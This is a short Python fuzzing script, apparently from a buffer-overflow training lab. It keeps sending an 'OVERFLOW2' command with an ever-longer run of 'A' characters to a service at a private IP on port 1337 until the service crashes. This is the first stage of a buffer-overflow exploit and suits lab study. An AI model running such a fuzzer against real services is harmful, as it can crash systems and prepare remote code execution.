#!/usr/bin/python3

import sys,socket,time

begin = b"OVERFLOW2 "
buffer = ("A" * 100).encode("utf-8") #You can use UTF-8 here because the char "A" is in the ASCII range. 
end = b"\r\n"

IP="10.10.192.98"
port=1337
timeout = 5

while True:
              try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(timeout)
                            s.connect((IP,port))
                            s.recv(1024)
                            print("Fuzzing with %s bytes" % len(buffer))
                            s.send((begin + buffer + end))
                            s.recv(1024)
                            s.close()
                            buffer += ("A" * 100).encode("utf-8")

              except:
                            print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                            sys.exit()
